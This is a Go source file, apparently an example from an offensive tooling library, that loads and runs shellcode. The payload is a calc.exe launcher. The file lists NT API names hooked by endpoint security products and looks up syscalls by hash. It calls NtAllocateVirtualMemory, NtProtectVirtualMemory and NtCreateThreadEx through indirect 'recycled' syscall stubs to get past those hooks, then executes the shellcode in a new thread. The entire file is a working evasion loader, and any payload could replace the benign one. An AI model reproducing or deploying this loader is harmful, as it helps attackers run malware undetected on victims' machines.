package main

import (
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"syscall"
	"unsafe"
)


var shellcode = []byte{
	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	0xd7,
}

//from https://github.com/Mr-Un1k0d3r/EDRs
var hookedapi  =[]string{"NtAddBootEntry","NtAdjustPrivilegesToken","NtAlertResumeThread","NtAllocateVirtualMemory","NtAllocateVirtualMemoryEx","NtAlpcConnectPort","NtAreMappedFilesTheSame","NtClose","NtCreateFile","NtCreateKey","NtCreateMutant","NtCreateProcess","NtCreateProcessEx","NtCreateSection","NtCreateThread","NtCreateThreadEx","NtCreateUserProcess","NtDelayExecution","NtDeleteBootEntry","NtDeleteFile","NtDeleteKey","NtDeleteValueKey","NtDeviceIoControlFile","NtDuplicateObject","NtFreeVirtualMemory","NtGdiBitBlt","NtGetContextThread","NtLoadDriver","NtMapUserPhysicalPages","NtMapViewOfSection","NtMapViewOfSectionEx","NtModifyBootEntry","NtOpenCreateFile","NtOpenFile","NtOpenKey","NtOpenKeyEx","NtOpenProcess","NtOpenProcessToken","NtOpenProcessTokenEx","NtOpenThreadToken","NtOpenThreadTokenEx","NtProtectVirtualMemory","NtQueryAttributesFile","NtQueryFullAttributesFile","NtQueryInformationProcess","NtQueryInformationThread","NtQueryInformationTokenTokenUser","NtQuerySystemInformation","NtQuerySystemInformationEx","NtQueryVirtualMemory","NtQueueApcThread","NtQueueApcThreadEx","NtQueueApcThreadEx2","NtReadVirtualMemory","NtRenameKey","NtResumeThread","NtSetContextThread","NtSetInformationFile","NtSetInformationProcess","NtSetInformationProcessCriticalProcess","NtSetInformationThread","NtSetInformationThreadCriticalThread","NtSetInformationThreadHideFromDebugger","NtSetInformationThreadImpersonationToken","NtSetInformationThreadWow64Context","NtSetInformationVirtualMemory","NtSetValueKey","NtSuspendThread","NtSystemDebugControl","NtTerminateProcess","NtTerminateThread","NtUnmapViewOfSection","NtUnmapViewOfSectionEx","NtUserGetAsyncKeyState","NtUserGetClipboardData","NtUserSetWindowsHookEx","NtWriteFile","NtWriteVirtualMemory","ZwAlertResumeThread","ZwAllocateVirtualMemory","ZwAllocateVirtualMemoryEx","ZwAlpcConnectPort","ZwAreMappedFilesTheSame","ZwClose","ZwCreateFile","ZwCreateKey","ZwCreateProcess","ZwCreateProcessEx","ZwCreateSection","ZwCreateThread","ZwCreateThreadEx","ZwCreateUserProcess","ZwDeleteFile","ZwDeleteKey","ZwDeleteValueKey","ZwDeviceIoControlFile","ZwDuplicateObject","ZwFreeVirtualMemory","ZwGetContextThread","ZwLoadDriver","ZwMapUserPhysicalPages","ZwMapViewOfSection","ZwMapViewOfSectionEx","ZwOpenFile","ZwOpenKey","ZwOpenKeyEx","ZwOpenProcess","ZwProtectVirtualMemory","ZwQueryAttributesFile","ZwQueryFullAttributesFile","ZwQueryInformationProcess","ZwQueryInformationThread","ZwQuerySystemInformation","ZwQuerySystemInformationEx","ZwQueryVirtualMemory","ZwQueueApcThread","ZwQueueApcThreadEx","ZwReadVirtualMemory","ZwRenameKey","ZwResumeThread","ZwSetContextThread","ZwSetInformationFile","ZwSetInformationProcess","ZwSetInformationThread","ZwSetValueKey","ZwSuspendThread","ZwTerminateProcess","ZwTerminateThread","ZwUnmapViewOfSection","ZwUnmapViewOfSectionEx","ZwWriteFile","ZwWriteVirtualMemory"}

var hashhooked []string

func main() {
	for _,v := range hookedapi{
		hashhooked = append(hashhooked,str2sha1(v))
		//it also support lower case
		//hashhooked = append(hashhooked,str2sha1(strings.ToLower(v)))
	}

	var thisThread = uintptr(0xffffffffffffffff)
	alloc, e := gabh.MemHgate(str2sha1("NtAllocateVirtualMemory"), str2sha1)
	if e != nil {
		panic(e)
	}
	protect, e := gabh.MemHgate(Sha256Hex("NtProtectVirtualMemory"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	createthread, e := gabh.MemHgate(Sha256Hex("NtCreateThreadEx"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	pWaitForSingleObject := syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject").Addr()

	createThread(shellcode, thisThread, alloc, protect, createthread, uint64(pWaitForSingleObject))
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {

	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))

	//callAddr := recycled.GetCall("",nil,nil)
	//callAddr := recycled.GetCall("NtDelayExecution",nil,str2sha1)
	callAddr := gabh.GetRecyCall("",hashhooked,str2sha1)

	r1, r := gabh.ReCycall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		callAddr,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}

	//copy shellcode
	memcpy(baseA, shellcode)

	var oldprotect uintptr
	callAddr = gabh.GetRecyCall("NtDelayExecution",nil,nil)

	r1, r = gabh.ReCycall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		callAddr,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}

	var hhosthread uintptr
	callAddr = gabh.GetRecyCall("",nil,nil)

	r1, r = gabh.ReCycall(
		NtCreateThreadExSysid, //NtCreateThreadEx
		callAddr,
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, handle, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
